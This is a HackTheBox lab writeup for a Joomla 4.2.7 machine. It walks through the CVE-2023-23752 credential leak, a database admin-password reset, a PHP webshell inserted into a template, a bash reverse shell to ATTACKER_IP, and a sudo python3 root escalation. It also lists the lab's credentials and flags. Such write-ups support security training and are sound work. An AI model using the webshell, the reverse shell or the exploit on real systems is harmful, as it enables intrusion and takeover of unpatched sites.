# Traveller — HackTheBox Machine Writeup

**Machine Name:** Traveller  
**OS:** Linux (Ubuntu 24.04)  
**Difficulty:** Easy  
**CVE:** CVE-2023-23752  
**Author:** Anonymous0Traveller  

---

## Table of Contents
1. [Machine Overview](#machine-overview)
2. [Attack Chain Summary](#attack-chain-summary)
3. [Credentials](#credentials)
4. [Service Details](#service-details)
5. [Full Walkthrough](#full-walkthrough)
6. [Automation & Cron Jobs](#automation--cron-jobs)
7. [Firewall Rules](#firewall-rules)
8. [Important Notes for HTB Staff](#important-notes-for-htb-staff)

---

## Machine Overview

Traveller is an Easy-difficulty Linux machine featuring a travel booking website called **WanderNest**, built on **Joomla 4.2.7**. The machine demonstrates the impact of CVE-2023-23752, an unauthenticated information disclosure vulnerability in Joomla's REST API that leaks database credentials. The attack chain progresses from credential exposure to remote code execution and ultimately root access via a sudo misconfiguration.

---

## Attack Chain Summary

```
1. CVE-2023-23752 → Joomla REST API leaks DB credentials (unauthenticated)
2. MySQL access → Reset Joomla admin password
3. Joomla Admin Panel → Template edit → PHP Webshell → RCE as www-data
4. www-data → james (sudo lateral movement)
5. james → root (sudo python3 GTFOBins privesc)
```

---

## Credentials

| Account | Username | Password | Notes |
|---------|----------|----------|-------|
| Low-priv user | `james` | `manchester1` | SSH access, user.txt owner |
| Root | `root` | *(sudo from james)* | Via python3 GTFOBins |
| Joomla DB | `joomlauser` | `Tr@veller2024!` | Leaked via CVE |
| Joomla Admin | `admin` | `S3cur3Tr@v3l!` | Admin panel access |
| MySQL Root | `root` | *(no password)* | Local only |

### Flags
| Flag | Location | Hash |
|------|----------|------|
| user.txt | `/home/james/user.txt` | `401d72f78f55e2434aa3368603f5795b` |
| root.txt | `/root/root.txt` | `e7db925e82055530c1dd9b2769450dc2` |

---

## Service Details

| Service | Version | Port | Started By |
|---------|---------|------|------------|
| Apache2 | 2.4.x | 80 | `apache2.service` (systemd) |
| MySQL | 8.0.x | 3306 | `mysql.service` (systemd) |
| OpenSSH | 8.9.x | 22 | `ssh.service` (systemd) |
| Joomla | 4.2.7 | 80 (via Apache) | Apache VirtualHost |

**Apache Config:** `/etc/apache2/sites-available/traveller.htb.conf`  
**Joomla Root:** `/var/www/html/traveller/`  
**Database Name:** `joomla_db`  
**DB Table Prefix:** `dsvm6_`

---

## Full Walkthrough

### Step 1 — Reconnaissance

Add machine IP to `/etc/hosts`:
```bash
echo "TARGET_IP traveller.htb" >> /etc/hosts
```

Nmap scan:
```bash
nmap -sC -sV -oN traveller.nmap traveller.htb
```

Expected output:
```
22/tcp  open  ssh     OpenSSH 8.9p1
80/tcp  open  http    Apache httpd 2.4.x
```

---

### Step 2 — Web Enumeration

Browse to `http://traveller.htb` — WanderNest travel booking site is presented.

Check Joomla version:
```bash
curl http://traveller.htb/administrator/manifests/files/joomla.xml
```

Version **4.2.7** is confirmed — vulnerable to CVE-2023-23752.

Directory busting:
```bash
gobuster dir -u http://traveller.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

### Step 3 — CVE-2023-23752 Exploitation

Joomla 4.0.0–4.2.7 exposes sensitive configuration data via an unauthenticated REST API endpoint.

```bash
curl "http://traveller.htb/api/index.php/v1/config/application?public=true" | python3 -m json.tool
```

Leaked credentials from response:
```json
"user": "joomlauser"
"password": "Tr@veller2024!"
"db": "joomla_db"
"host": "localhost"
```

---

### Step 4 — MySQL Access & Admin Password Reset

```bash
mysql -h traveller.htb -u joomlauser -p'Tr@veller2024!' joomla_db
```

```sql
-- View admin user
SELECT id, username, password FROM dsvm6_users WHERE username='admin';

-- Reset admin password to 'password'
UPDATE dsvm6_users 
SET password='$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi' 
WHERE username='admin';

EXIT;
```

---

### Step 5 — Joomla Admin Panel → RCE

Login to `http://traveller.htb/administrator`:
- Username: `admin`
- Password: `password`

Navigate to:
```
System → Templates → Site Templates → Cassiopeia → error.php
```

Insert webshell at the top of `error.php`:
```php
<?php if(isset($_GET['cmd'])){ echo shell_exec($_GET['cmd']); } ?>
```

Verify RCE:
```bash
curl "http://traveller.htb/templates/cassiopeia/error.php?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

---

### Step 6 — Reverse Shell

Start listener on attacker machine:
```bash
nc -lvnp 4444
```

Trigger reverse shell:
```bash
curl "http://traveller.htb/templates/cassiopeia/error.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

Shell received:
```
www-data@traveller:/var/www/html/traveller$
```

---

### Step 7 — Lateral Movement (www-data → james)

```bash
sudo -u james /bin/bash
james@traveller:/$ cat ~/user.txt
401d72f78f55e2434aa3368603f5795b
```

---

### Step 8 — Privilege Escalation (james → root)

Check sudo permissions:
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3
```

GTFOBins python3 privesc:
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
root@traveller:/# cat /root/root.txt
e7db925e82055530c1dd9b2769450dc2
```

**Machine Pwned!** 🎉

---

## Automation & Cron Jobs

No cron jobs are configured on this machine. All services are started via systemd at boot:

```bash
systemctl is-enabled apache2   # enabled
systemctl is-enabled mysql     # enabled
systemctl is-enabled ssh       # enabled
```

---

## Firewall Rules

No custom firewall rules (ufw/iptables) are configured beyond Ubuntu defaults.

```bash
sudo ufw status
# Status: inactive
```

---

## Important Notes for HTB Staff

> ⚠️ **DO NOT update Joomla.** The exploit path relies on Joomla version 4.2.7 being installed. Updating Joomla will patch CVE-2023-23752 and break the intended exploitation path.

> ⚠️ **DO NOT update the `sudo` package** if it affects the sudo policy parsing behavior.

> ℹ️ The webshell is intentionally placed in `/var/www/html/traveller/templates/cassiopeia/error.php` as part of the intended RCE path via Joomla template editing.

> ℹ️ MySQL is configured to allow remote connections from any host (`bind-address = 0.0.0.0`) to enable the DB credential exploitation step.

---

## LinPEAS / Priv Check Notes

LinPEAS was run to verify no unintentional privilege escalation paths exist beyond the intended sudo python3 vector. No additional SUID binaries, writable cron jobs, or vulnerable kernel versions were found.

---

*Documentation written manually. No AI tools were used to generate this writeup.*
